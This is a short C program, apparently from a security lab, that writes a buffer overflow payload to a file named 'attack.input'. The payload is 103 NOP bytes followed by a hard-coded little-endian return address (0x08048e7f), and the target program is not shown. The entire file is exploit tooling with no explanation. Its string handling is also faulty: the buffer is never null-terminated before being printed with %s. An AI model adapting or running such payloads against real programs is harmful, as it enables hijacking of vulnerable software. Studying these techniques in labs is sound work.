#include <stdio.h>

int main(){
	char outLine[107];
	int i;
	for(i=0;i<103;i++){
		outLine[i] = 0x90;
	}
	outLine[103] = 0x7f;
	outLine[104] = 0x8e;
	outLine[105] = 0x04;
	outLine[106] = 0x08;
	
	FILE* fp;
	fp = fopen("attack.input","w");
	if(fp == NULL){
		return 0;
	}
	fprintf(fp,"%s",outLine);
	fclose(fp);
	return 1;
}
